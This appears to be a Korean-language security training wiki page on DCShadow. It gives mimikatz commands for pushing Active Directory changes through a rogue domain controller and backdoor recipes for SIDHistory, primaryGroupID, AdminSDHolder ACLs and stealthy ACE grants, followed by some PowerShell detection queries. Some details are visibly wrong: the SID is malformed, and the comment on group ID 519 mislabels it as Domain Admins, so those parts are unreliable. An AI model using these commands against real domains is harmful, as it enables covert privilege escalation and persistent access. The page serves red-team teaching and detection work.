# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

AD에 **new Domain Controller**를 등록하고, 지정된 객체에 대해 SIDHistory, SPNs... 같은 속성을 **push attributes**하여 **modifications**와 관련된 어떤 **logs**도 남기지 않습니다. 당신은 **need DA** 권한이 필요하며 **root domain** 내부에 있어야 합니다.\
잘못된 데이터를 사용하면 보기 안 좋은 **logs**가 생성될 수 있습니다.

공격을 수행하려면 2개의 mimikatz 인스턴스가 필요합니다. 그 중 하나는 SYSTEM 권한으로 RPC servers를 시작합니다 (여기에 수행하려는 변경 사항을 지정해야 함), 다른 인스턴스는 값을 push하는 데 사용됩니다:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
참고: **`elevate::token`**은 `mimikatz1` 세션에서 작동하지 않습니다. 해당 명령은 스레드의 권한만 상승시키며, 우리는 프로세스의 권한을 상승시켜야 합니다.\
또한 "LDAP" 객체를 선택할 수도 있습니다: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

변경 사항은 DA 또는 다음 최소 권한을 가진 사용자로부터 적용할 수 있습니다:

- 도메인 객체에서:
- _DS-Install-Replica_ (도메인에서 복제본 추가/제거)
- _DS-Replication-Manage-Topology_ (복제 토폴로지 관리)
- _DS-Replication-Synchronize_ (복제 동기화)
- Configuration 컨테이너의 **Sites object**(및 그 하위 항목):
- _CreateChild and DeleteChild_
- DC로 등록된 **computer**의 객체:
- _WriteProperty_ (Write 아님)
- 타깃 객체:
- _WriteProperty_ (Write 아님)

[**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1)를 사용해 비권한 사용자가 이 권한들을 갖도록 설정할 수 있습니다(이 작업은 일부 로그를 남긴다는 점에 유의하세요). 이는 DA 권한을 갖는 것보다 훨씬 제한적입니다.\
예: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  
이 명령은 사용자 이름 _**student1**_이 머신 _**mcorp-student1**_에 로그인했을 때 객체 _**root1user**_에 대해 DCShadow 권한을 가진다는 의미입니다.

## DCShadow를 사용해 백도어 생성하기
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Primary 그룹 악용, 열거 누락 및 탐지

- `primaryGroupID`는 그룹 `member` 목록과 별개의 속성입니다. DCShadow/DSInternals는 이를 직접 쓸 수 있으며(예: **Domain Admins**에 대해 `primaryGroupID=512`로 설정), 온박스 LSASS 강제 적용 없이도 가능하지만, AD는 여전히 사용자를 **이동**시킵니다: PGID를 변경하면 항상 이전 primary 그룹의 멤버십이 제거됩니다(다른 대상 그룹에서도 동일한 동작). 따라서 이전 primary 그룹 멤버십을 유지할 수 없습니다.
- 기본 도구는 사용자를 현재 primary 그룹에서 제거하는 것을 차단합니다(`ADUC`, `Remove-ADGroupMember`), 따라서 PGID 변경은 일반적으로 직접 디렉터리 쓰기(DCShadow/`Set-ADDBPrimaryGroup`)가 필요합니다.
- 멤버십 보고는 일관되지 않습니다:
  - **포함** primary-group에서 파생된 멤버: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
  - **제외** primary-group에서 파생된 멤버: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit로 `member` 검사, `Get-ADUser <user> -Properties memberOf`.
- 재귀 검사(recursive checks)는 **primary 그룹 자체가 중첩된 경우** primary-group 멤버를 놓칠 수 있습니다(예: 사용자 PGID가 Domain Admins 내부의 중첩된 그룹을 가리키는 경우); `Get-ADGroupMember -Recursive` 또는 LDAP 재귀 필터는 재귀가 명시적으로 primary 그룹을 해석하지 않는 한 해당 사용자를 반환하지 않습니다.
- DACL 트릭: 공격자는 사용자에 대해 `primaryGroupID`에 대해 **deny ReadProperty**를 설정하거나(또는 AdminSDHolder가 아닌 그룹의 경우 그룹의 `member` 속성에 대해) 대부분의 PowerShell 쿼리에서 유효한 멤버십을 숨길 수 있습니다; `net group`은 여전히 멤버십을 확인합니다. AdminSDHolder로 보호되는 그룹은 이러한 거부를 재설정합니다.

탐지/모니터링 예:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
특권 그룹을 확인하려면 `Get-ADGroupMember` 출력과 `Get-ADGroup -Properties member` 또는 ADSI Edit를 비교하여 `primaryGroupID` 또는 숨겨진 속성으로 인해 발생한 불일치를 찾아보세요.

## Shadowception - Give DCShadow permissions using DCShadow (no modified permissions logs)

다음 ACE들을 사용자 SID를 끝에 추가해야 합니다:

- 도메인 객체에:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- 공격자 컴퓨터 객체에: `(A;;WP;;;UserSID)`
- 대상 사용자 객체에: `(A;;WP;;;UserSID)`
- Configuration 컨테이너의 Sites 객체에: `(A;CI;CCDC;;;UserSID)`

객체의 현재 ACE를 확인하려면: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

이 경우 한 번이 아니라 **여러 변경**을 해야 한다는 점에 유의하세요. 따라서 **mimikatz1 session** (RPC server)에서 적용하려는 각 변경에 대해 **`/stack`** 파라미터를 사용하세요. 이렇게 하면 rouge server에 대기 중인 모든 변경을 적용하기 위해 **`/push`**를 한 번만 실행하면 됩니다.

[**More information about DCShadow in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## References

- [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
